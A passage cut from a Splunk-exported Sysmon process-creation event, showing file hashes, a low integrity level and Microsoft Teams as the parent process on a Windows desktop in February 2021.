1\r\nIntegrityLevel: Low\r\nHashes: SHA1=F7A66CB007953E67442C9A473F772D210E4539AC,MD5=0AF216F9DC9F5E899A0B56F650A1E4EF,SHA256=B3AF485CC7B02A60C9422EAEC23821F1C92CA15221153CD32F63E8244AE38006,IMPHASH=B64D42F34FD355F7B22A35E8F64CC156\r\nParentProcessGuid: {f589267d-9e99-6032-0601-000000002a00}\r\nParentProcessId: 8936\r\nParentImage: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\r\nParentCommandLine: \"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --system-initiated","_time":"2021-02-21T11:27:42.000-0800","date_hour":"11","date_mday":"21","date_minute":"27","date_month":"february","date_second":"42","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=,=\\r:_--_:","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
